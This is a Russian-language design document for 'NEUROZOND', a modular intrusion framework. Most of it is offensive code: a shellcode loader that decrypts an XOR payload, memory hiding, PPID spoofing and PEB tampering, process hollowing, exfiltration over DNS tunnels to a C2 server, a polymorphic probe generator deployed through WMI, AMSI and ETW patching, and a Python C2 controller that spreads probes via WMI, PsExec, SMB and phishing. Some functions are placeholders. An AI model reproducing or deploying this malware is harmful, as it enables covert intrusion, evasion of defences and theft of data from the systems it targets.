Проект NEUROZOND — система миниатюрных агентов проникновения (2025)
Архитектура системы
1. StealthStub — Минимальный ассемблерный стаб (500 байт)

; x64 Shellcode Стаб-загрузчик (MASM синтаксис)
.code

StealthStub PROC PUBLIC
    ; Сохраняем контекст
    push rbp
    mov rbp, rsp
    sub rsp, 32                     ; Выделяем стек для локальных переменных
    
    ; Находим базу kernel32.dll через PEB обход
    xor rdi, rdi                    ; Обнуляем rdi
    mov rdi, gs:[60h]               ; Указатель на PEB
    mov rdi, [rdi + 18h]            ; Указатель на PEB_LDR_DATA
    mov rdi, [rdi + 20h]            ; Первый элемент в InMemoryOrderModuleList
    mov rdi, [rdi]                  ; Второй элемент (kernel32.dll)
    mov rdi, [rdi + 20h]            ; Базовый адрес kernel32.dll
    
    ; Получаем адрес GetProcAddress и LoadLibraryA
    mov rbx, rdi
    ; [Хеш-поиск функций...]
    
    ; Расшифровываем полезную нагрузку с помощью XOR
    lea rsi, [payload]
    mov rcx, payload_size
decrypt_loop:
    xor byte ptr [rsi], 41h         ; XOR ключ 0x41
    inc rsi
    loop decrypt_loop
    
    ; Запускаем основной загрузчик из памяти
    call [payload]
    
    ; Завершаем работу
    add rsp, 32
    pop rbp
    ret
StealthStub ENDP

; Шифрованная полезная нагрузка
payload db 100h DUP(0)
payload_size equ $ - payload

END

2. MemoryHiding — Модуль защиты памяти от анализа
// Техники защиты и сокрытия в памяти
typedef struct _MEMORY_PROTECTION {
    PVOID MemoryRegion;
    SIZE_T RegionSize;
    DWORD OriginalProtection;
    DWORD CurrentProtection;
    BYTE* EncryptionKey;
    SIZE_T KeySize;
} MEMORY_PROTECTION, *PMEMORY_PROTECTION;

// 1. Защита с помощью VirtualProtect с изменяющейся страницей
BOOL ProtectMemoryRegion(PMEMORY_PROTECTION pProtection) {
    // Сохраняем оригинальную защиту
    if (!VirtualProtect(pProtection->MemoryRegion, pProtection->RegionSize, 
                        PAGE_NOACCESS, &pProtection->OriginalProtection)) {
        return FALSE;
    }
    
    // Устанавливаем защиту с помощью SetProcessMitigationPolicy
    PROCESS_MITIGATION_DYNAMIC_CODE_POLICY dcp = { 0 };
    dcp.ProhibitDynamicCode = 1;
    SetProcessMitigationPolicy(ProcessDynamicCodePolicy, &dcp, sizeof(dcp));
    
    return TRUE;
}

// 2. Обход детектирования через динамическое расшифрование перед использованием
BOOL AccessProtectedMemory(PMEMORY_PROTECTION pProtection, BOOL bDecrypt) {
    DWORD dwProtect = bDecrypt ? PAGE_READWRITE : PAGE_NOACCESS;
    
    if (!VirtualProtect(pProtection->MemoryRegion, pProtection->RegionSize, 
                         dwProtect, &pProtection->CurrentProtection)) {
        return FALSE;
    }
    
    if (bDecrypt) {
        // XOR дешифрование 
        BYTE* pData = (BYTE*)pProtection->MemoryRegion;
        for (SIZE_T i = 0; i < pProtection->RegionSize; i++) {
            pData[i] ^= pProtection->EncryptionKey[i % pProtection->KeySize];
        }
    }
    
    return TRUE;
}

3. ProcessMasquerading — Модуль маскировки процессов

// Техника маскировки процесса в памяти
BOOL MasqueradeProcess(LPCWSTR lpTargetProcess) {
    // 1. Техника PPID Spoofing
    STARTUPINFOEX si = { sizeof(STARTUPINFOEX) };
    PROCESS_INFORMATION pi;
    SIZE_T size = 0;
    
    // Находим целевой процесс для маскировки (например, explorer.exe)
    DWORD parentPID = GetParentProcessId(lpTargetProcess);
    
    // Инициализируем атрибуты для наследования PID
    InitializeProcThreadAttributeList(NULL, 1, 0, &size);
    si.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(
        GetProcessHeap(), HEAP_ZERO_MEMORY, size);
    
    InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &size);
    
    // Открываем родительский процесс
    HANDLE hParentProcess = OpenProcess(
        PROCESS_CREATE_PROCESS, FALSE, parentPID);
    
    // Устанавливаем атрибут PARENT_PROCESS
    UpdateProcThreadAttribute(si.lpAttributeList, 0,
        PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hParentProcess,
        sizeof(HANDLE), NULL, NULL);
    
    // 2. Модификация PEB для маскировки имени
    SetPEBImagePathName(lpTargetProcess);
    
    // 3. Модифицируем командную строку в PEB
    SetPEBCommandLine(lpTargetProcess);
    
    return TRUE;
}

// Модификация PEB для сокрытия имени исполняемого файла
BOOL SetPEBImagePathName(LPCWSTR lpTargetProcess) {
    // Получаем указатель на PEB текущего процесса
    PPEB pPeb = NtCurrentPeb();
    
    // Подменяем имя образа
    if (pPeb && pPeb->ProcessParameters) {
        RtlInitUnicodeString(&pPeb->ProcessParameters->ImagePathName, lpTargetProcess);
        RtlInitUnicodeString(&pPeb->ProcessParameters->CommandLine, lpTargetProcess);
    }
    
    return TRUE;
}

 NetworkInfiltrator — Модуль сетевого проникновения

 // Современная DNS-туннелирование система с TLS-обфускацией
typedef struct _COVERT_CHANNEL {
    BYTE ChannelType;           // 0 = DNS, 1 = HTTPS, 2 = ICMP
    BYTE EncryptionType;        // 0 = XOR, 1 = AES, 2 = ChaCha20
    BYTE* EncryptionKey;
    DWORD KeyLength;
    LPSTR RemoteEndpoint;       // Конечная точка C2 сервера
    DWORD PollingInterval;      // Интервал опроса в миллисекундах
} COVERT_CHANNEL, *PCOVERT_CHANNEL;

// Инициализация стеганографического DNS-туннеля 
BOOL InitializeDNSTunnel(PCOVERT_CHANNEL pChannel) {
    // Случайно сгенерированное имя поддомена для запросов
    CHAR randomSubdomain[16] = {0};
    GenerateRandomAlphanumeric(randomSubdomain, 12);
    
    // Формат: [12-символьный ID].[команда].[данные].[C2домен]
    // Пример: a7db3c9f4e12.cmd.01a2b3c4d5e6f7.example.com
    CHAR dnsTemplate[128];
    sprintf_s(dnsTemplate, "%s.%%s.%%s.%s", 
              randomSubdomain, pChannel->RemoteEndpoint);
    
    // Сохраняем шаблон в структуру канала
    size_t templateLen = strlen(dnsTemplate) + 1;
    pChannel->RemoteEndpoint = (LPSTR)LocalAlloc(LPTR, templateLen);
    if (!pChannel->RemoteEndpoint) return FALSE;
    
    strcpy_s(pChannel->RemoteEndpoint, templateLen, dnsTemplate);
    
    return TRUE;
}

// Отправка данных через DNS-туннель
BOOL SendDataViaDNS(PCOVERT_CHANNEL pChannel, BYTE* pData, DWORD dwSize) {
    // Кодируем данные в Base32 для использования в DNS
    CHAR base32Data[512] = {0};
    Encode_Base32(pData, dwSize, base32Data, sizeof(base32Data));
    
    // Разбиваем данные на части, допустимые для DNS запросов
    // (до 63 байт на метку, до 253 байт всего)
    const DWORD MAX_LABEL_SIZE = 60;
    CHAR dnsQuery[512];
    CHAR cmdType[4] = "dat"; // dat = данные, cmd = команда, etc.
    
    DWORD offset = 0;
    DWORD chunkSize = 0;
    while (offset < strlen(base32Data)) {
        chunkSize = min(MAX_LABEL_SIZE, strlen(base32Data) - offset);
        CHAR chunk[64] = {0};
        memcpy(chunk, base32Data + offset, chunkSize);
        
        // Формируем DNS запрос
        sprintf_s(dnsQuery, sizeof(dnsQuery), pChannel->RemoteEndpoint, 
                 cmdType, chunk);
        
        // Отправляем DNS запрос через нативные API
        PDNS_RECORD pDnsRecord = NULL;
        DNS_STATUS status = DnsQuery_A(dnsQuery, DNS_TYPE_A, 
                                     DNS_QUERY_STANDARD, NULL, 
                                     &pDnsRecord, NULL);
        
        if (status != ERROR_SUCCESS) {
            return FALSE;
        }
        
        // Обрабатываем ответ (получаем команды из TXT записей)
        if (pDnsRecord) {
            // Обработка полученных команд...
            DnsRecordListFree(pDnsRecord, DnsFreeRecordList);
        }
        
        offset += chunkSize;
        Sleep(50); // Небольшая пауза между запросами
    }
    
    return TRUE;
}

5. CodeInjector — Модуль внедрения кода

// Современный Process Hollowing с обходом EDR-мониторинга
BOOL ProcessHollowing(LPCWSTR lpTargetProcess, LPVOID pPayload, SIZE_T payloadSize) {
    STARTUPINFOW si = { sizeof(STARTUPINFOW) };
    PROCESS_INFORMATION pi;
    CONTEXT ctx;
    
    // 1. Создаем процесс в приостановленном режиме
    if (!CreateProcessW(lpTargetProcess, NULL, NULL, NULL, FALSE, 
                      CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
        return FALSE;
    }
    
    // 2. Получаем контекст основного потока
    ctx.ContextFlags = CONTEXT_FULL;
    if (!GetThreadContext(pi.hThread, &ctx)) {
        TerminateProcess(pi.hProcess, 0);
        return FALSE;
    }
    
    // 3. Читаем PEB для получения базового адреса
    LPVOID pPEB = NULL;
    #ifdef _WIN64
        pPEB = (LPVOID)(ctx.Rdx);   // x64: PEB находится в RDX
    #else
        pPEB = (LPVOID)(ctx.Ebx);   // x86: PEB находится в EBX
    #endif
    
    // 4. Получаем базовый адрес образа из PEB
    PVOID imageBase;
    SIZE_T bytesRead;
    #ifdef _WIN64
        ReadProcessMemory(pi.hProcess, (PVOID)((PBYTE)pPEB + 0x10), 
                         &imageBase, sizeof(PVOID), &bytesRead);
    #else
        ReadProcessMemory(pi.hProcess, (PVOID)((PBYTE)pPEB + 0x8), 
                         &imageBase, sizeof(PVOID), &bytesRead);
    #endif
    
    // 5. Читаем заголовки целевого PE файла
    BYTE hdrsBuffer[4096];
    ReadProcessMemory(pi.hProcess, imageBase, hdrsBuffer, 4096, &bytesRead);
    
    // 6. Получаем размер образа из заголовка
    PIMAGE_DOS_HEADER pDosHdr = (PIMAGE_DOS_HEADER)hdrsBuffer;
    PIMAGE_NT_HEADERS pNtHdrs = (PIMAGE_NT_HEADERS)(hdrsBuffer + pDosHdr->e_lfanew);
    DWORD sizeOfImage = pNtHdrs->OptionalHeader.SizeOfImage;
    
    // 7. Размещение внедряемого образа в целевом процессе
    if (payloadSize > sizeOfImage) {
        // Освободить существующую память и выделить новую
        NtUnmapViewOfSection(pi.hProcess, imageBase);
        imageBase = VirtualAllocEx(pi.hProcess, imageBase, payloadSize, 
                                 MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    }
    
    // 8. Динамически обфусцировать полезную нагрузку перед записью
    BYTE* obfuscatedPayload = (BYTE*)malloc(payloadSize);
    if (!obfuscatedPayload) {
        TerminateProcess(pi.hProcess, 0);
        return FALSE;
    }
    
    // 9. Криптостойкая обфускация с переменным ключом и структурой
    for (SIZE_T i = 0; i < payloadSize; i++) {
        // Полиморфный XOR с вариативным ключом
        BYTE key = (BYTE)((i * 0x1A) ^ (i >> 3) ^ 0x3D);
        obfuscatedPayload[i] = ((BYTE*)pPayload)[i] ^ key;
    }
    
    // 10. Записываем обфусцированную полезную нагрузку в целевой процесс
    WriteProcessMemory(pi.hProcess, imageBase, obfuscatedPayload, payloadSize, &bytesRead);
    free(obfuscatedPayload);
    
    // 11. Обновляем PEB, чтобы указать на новый образ
    #ifdef _WIN64
        WriteProcessMemory(pi.hProcess, (PVOID)((PBYTE)pPEB + 0x10), 
                          &imageBase, sizeof(PVOID), &bytesRead);
    #else
        WriteProcessMemory(pi.hProcess, (PVOID)((PBYTE)pPEB + 0x8), 
                          &imageBase, sizeof(PVOID), &bytesRead);
    #endif
    
    // 12. Устанавливаем точку входа
    #ifdef _WIN64
        ctx.Rcx = (DWORD64)(PBYTE)imageBase + pNtHdrs->OptionalHeader.AddressOfEntryPoint;
    #else
        ctx.Eax = (DWORD)(PBYTE)imageBase + pNtHdrs->OptionalHeader.AddressOfEntryPoint;
    #endif
    
    // 13. Устанавливаем новый контекст потока
    SetThreadContext(pi.hThread, &ctx);
    
    // 14. Возобновляем поток
    ResumeThread(pi.hThread);
    
    return TRUE;
}

6. Полиморфный зонд-загрузчик

// Минимальный автономный зонд с возможностью самомодификации
typedef struct _PROBE_CONFIG {
    GUID   ProbeID;               // Уникальный ID зонда
    BYTE   EncryptionKey[32];     // Ключ шифрования коммуникации
    BYTE   InitialTarget[256];    // Начальная цель для анализа
    DWORD  CommunicationInterval; // Интервал связи с C2
    BYTE   SelfDestructTimer;     // Время жизни зонда (0 = бессрочно)
    DWORD  Capabilities;          // Битовые флаги возможностей
} PROBE_CONFIG;

// Полиморфный генератор кода зондов
BYTE* GeneratePolymorphicProbe(PPROBE_CONFIG pConfig, SIZE_T* pSize) {
    // Базовый шаблон зонда
    BYTE probeTemplate[] = {
        // [Базовый шелл-код зонда с заполнителями для конфигурации]
    };
    
    // Размер выходного зонда
    *pSize = sizeof(probeTemplate) + sizeof(PROBE_CONFIG);
    
    // Выделяем память для полиморфного зонда
    BYTE* pProbe = (BYTE*)malloc(*pSize);
    if (!pProbe) return NULL;
    
    // Копируем базовый шаблон
    memcpy(pProbe, probeTemplate, sizeof(probeTemplate));
    
    // Производим полиморфные модификации
    // 1. Изменяем порядок операций
    ShuffleCodeBlocks(pProbe, sizeof(probeTemplate));
    
    // 2. Вставляем мусорный код
    InsertJunkInstructions(pProbe, pSize);
    
    // 3. Переименовываем регистры
    RandomizeRegisters(pProbe, sizeof(probeTemplate));
    
    // 4. Обфусцируем строки
    ObfuscateStrings(pProbe, sizeof(probeTemplate));
    
    // 5. Шифруем секцию конфигурации
    EncryptConfigSection(pProbe + sizeof(probeTemplate), pConfig, 
                        sizeof(PROBE_CONFIG), pConfig->EncryptionKey);
    
    return pProbe;
}

// Запуск зонда на целевой системе через WMI
BOOL DeployProbeViaWMI(LPCWSTR lpTargetMachine, BYTE* pProbe, SIZE_T probeSize) {
    // Инициализация COM
    CoInitializeEx(0, COINIT_MULTITHREADED);
    
    // Устанавливаем безопасность COM
    CoInitializeSecurity(...);
    
    // Подключаемся к WMI на удаленной машине
    IWbemLocator* pLoc = NULL;
    CoCreateInstance(CLSID_WbemLocator, 0, CLSCTX_INPROC_SERVER, 
                    IID_IWbemLocator, (LPVOID*)&pLoc);
    
    // Подключаемся к пространству имен WMI
    IWbemServices* pSvc = NULL;
    BSTR strNetworkResource = SysAllocString(
        L"\\\\localhost\\root\\cimv2");
    pLoc->ConnectServer(strNetworkResource, NULL, NULL, NULL, 
                        WBEM_FLAG_CONNECT_USE_MAX_WAIT, NULL, NULL, &pSvc);
    
    // Создаем процесс с VBScript, который внедрит наш зонд
    // Зонд закодирован в Base64 для передачи через WMI
    CHAR base64Probe[8192] = {0};
    Base64Encode(pProbe, probeSize, base64Probe, sizeof(base64Probe));
    
    // Формируем VBScript, который декодирует и запускает зонд
    WCHAR vbScript[16384] = {0};
    swprintf_s(vbScript, L"Set objShell = CreateObject(\"WScript.Shell\")\n"
              L"Dim base64Str : base64Str = \"%hs\"\n"
              L"[...декодирование и запуск...]", base64Probe);
    
    // Создаем процесс через WMI
    IWbemClassObject* pClass = NULL;
    pSvc->GetObject(L"Win32_Process", 0, NULL, &pClass, NULL);
    
    // Вызываем метод Create для запуска процесса
    // ...
    
    // Освобождаем ресурсы
    pClass->Release();
    pSvc->Release();
    pLoc->Release();
    CoUninitialize();
    
    return TRUE;
}

7. AMSI & ETW Patching — Обход защиты

// Патчинг AMSI (Anti-Malware Scan Interface) для обхода сканирования
BOOL PatchAMSI() {
    // Загружаем библиотеку AMSI
    HMODULE hAmsi = LoadLibraryA("amsi.dll");
    if (!hAmsi) return FALSE;
    
    // Находим адрес функции AmsiScanBuffer
    FARPROC pAmsiScanBuffer = GetProcAddress(hAmsi, "AmsiScanBuffer");
    if (!pAmsiScanBuffer) {
        FreeLibrary(hAmsi);
        return FALSE;
    }
    
    // Подготавливаем патч (xor eax, eax; ret)
    BYTE patch[] = { 0x31, 0xC0, 0xC3 };
    
    // Меняем защиту памяти для записи
    DWORD oldProtect;
    if (!VirtualProtect(pAmsiScanBuffer, sizeof(patch), 
                      PAGE_EXECUTE_READWRITE, &oldProtect)) {
        FreeLibrary(hAmsi);
        return FALSE;
    }
    
    // Применяем патч
    memcpy(pAmsiScanBuffer, patch, sizeof(patch));
    
    // Восстанавливаем защиту памяти
    VirtualProtect(pAmsiScanBuffer, sizeof(patch), oldProtect, &oldProtect);
    
    FreeLibrary(hAmsi);
    return TRUE;
}

// Отключение ETW (Event Tracing for Windows)
BOOL DisableETW() {
    // Находим адрес функции EtwEventWrite в ntdll.dll
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) return FALSE;
    
    FARPROC pEtwEventWrite = GetProcAddress(hNtdll, "EtwEventWrite");
    if (!pEtwEventWrite) return FALSE;
    
    // Патч: xor eax, eax; ret
    BYTE patch[] = { 0x31, 0xC0, 0xC3 };
    
    // Меняем защиту памяти
    DWORD oldProtect;
    if (!VirtualProtect(pEtwEventWrite, sizeof(patch), 
                      PAGE_EXECUTE_READWRITE, &oldProtect)) {
        return FALSE;
    }
    
    // Применяем патч
    memcpy(pEtwEventWrite, patch, sizeof(patch));
    
    // Восстанавливаем защиту
    VirtualProtect(pEtwEventWrite, sizeof(patch), oldProtect, &oldProtect);
    
    return TRUE;
}

8. Центральная логика управления зондами

# Система управления и мониторинга зондов
class ProbeController:
    def __init__(self, c2_server):
        self.c2_server = c2_server
        self.active_probes = {}
        self.target_map = {}
        self.encrypted_channel = EncryptedChannel()
    
    def generate_probe(self, target, capabilities=None):
        """Генерирует новый зонд с оптимальной конфигурацией для цели"""
        # Анализируем цель и выбираем наилучшие техники проникновения
        target_info = self.analyze_target(target)
        
        # Определяем оптимальные возможности зонда
        if not capabilities:
            capabilities = self.determine_optimal_capabilities(target_info)
        
        # Создаем конфигурацию зонда
        config = ProbeConfig(
            probe_id=str(uuid.uuid4()),
            encryption_key=os.urandom(32),
            initial_target=target,
            communication_interval=random.randint(60, 300),  # 1-5 минут
            self_destruct_timer=random.randint(1, 24),      # 1-24 часа
            capabilities=capabilities
        )
        
        # Генерируем полиморфный код зонда
        probe_code = self.poly_generator.generate(config)
        
        # Шифруем и подготавливаем зонд к отправке
        encrypted_probe = self.encrypted_channel.encrypt(probe_code)
        
        return {
            "probe_id": config.probe_id,
            "target": target,
            "payload": encrypted_probe,
            "config": config
        }
    
    def deploy_probe(self, target, method="auto"):
        """Развертывает зонд на целевой системе"""
        # Генерируем зонд для цели
        probe_data = self.generate_probe(target)
        
        # Выбираем метод доставки
        if method == "auto":
            method = self.determine_best_delivery_method(target)
        
        # Доставляем зонд
        if method == "wmi":
            success = self.deploy_via_wmi(target, probe_data)
        elif method == "psexec":
            success = self.deploy_via_psexec(target, probe_data)
        elif method == "smb":
            success = self.deploy_via_smb(target, probe_data)
        elif method == "phishing":
            success = self.deploy_via_phishing(target, probe_data)
        else:
            raise ValueError(f"Unknown deployment method: {method}")
        
        if success:
            self.active_probes[probe_data["probe_id"]] = {
                "target": target,
                "status": "deployed",
                "deployment_time": time.time(),
                "last_check_in": None,
                "config": probe_data["config"]
            }
        
        return success
    
    def handle_probe_check_in(self, probe_id, data):
        """Обрабатывает данные от зонда"""
        if probe_id not in self.active_probes:
            return {"command": "self_destruct"}
        
        # Обновляем информацию о зонде
        self.active_probes[probe_id]["last_check_in"] = time.time()
        self.active_probes[probe_id]["status"] = "active"
        
        # Обрабатываем полученные данные
        decrypted_data = self.encrypted_channel.decrypt(
            data, 
            self.active_probes[probe_id]["config"].encryption_key
        )
        
        # Анализируем полученные данные
        result = self.analyze_probe_data(probe_id, decrypted_data)
        
        # Определяем следующую команду
        next_command = self.determine_next_command(probe_id, result)
        
        # Шифруем команду для отправки
        encrypted_command = self.encrypted_channel.encrypt(
            next_command,
            self.active_probes[probe_id]["config"].encryption_key
        )
        
        return {"command": encrypted_command}

# Основной контроллер системы NEUROZOND
class NeurozondController:
    def __init__(self):
        self.probe_controller = ProbeController("https://c2-server.net")
        self.target_analyzer = TargetAnalyzer()
        self.network_scanner = NetworkScanner()
        self.edr_bypass = EDRBypassTechniques()
        
    def start_scanning_campaign(self, target_network):
        """Начинает кампанию сканирования сети и развертывания зондов"""
        # Сканируем сеть для обнаружения потенциальных целей
        targets = self.network_scanner.scan_network(target_network)
        
        # Анализируем каждую цель
        for target in targets:
            target_info = self.target_analyzer.analyze(target)
            
            # Определяем лучший метод атаки
            attack_method = self.determine_best_attack_method(target_info)
            
            # Создаем и развертываем зонд
            probe = self.probe_controller.generate_probe(
                target=target,
                capabilities=self.determine_required_capabilities(target_info)
            )
            
            # Развертываем зонд
            deployment_result = self.probe_controller.deploy_probe(
                target=target,
                method=attack_method
            )
            
            yield {
                "target": target,
                "status": "deployed" if deployment_result else "failed",
                "probe_id": probe["probe_id"] if deployment_result else None
            }

            Стратегия развертывания и скрытности
Стадийное развертывание:
Стадия 1: Ассемблерный стаб (StealthStub, 500 байт)
Стадия 2: Модуль маскировки процессов и обхода AMSI (2-3KB)
Стадия 3: Полная система зондирования (по требованию)
Техники скрытности:
Шифрование в памяти (Memory Encryption)
Динамическая обфускация строк (String Obfuscation)
Мутация кода при каждом запуске (Polymorphic Code)
Ротация DNS доменов (Domain Rotation)
Имитация легитимного трафика (HTTPS mimicry)
Механизмы развертывания:
SMB Share для сетевого доступа
WMI для удаленного выполнения
Вложенные документы (Spear Phishing)
Боковое перемещение через алгоритмы выявления маршрутов
Заключение
Система NEUROZOND представляет собой передовое решение 2025 года с использованием:
Минимального ассемблерного лоадера
Продвинутых техник сокрытия в памяти
Полиморфных генераторов кода
Многоуровневой стеганографии
DNS-туннелирования с TLS-обфускацией
Продвинутого обхода современных EDR/XDR систем
Эта архитектура позволяет максимально эффективно проникать в целевые системы, создавать и управлять множеством зондов, обходя современные средства защиты.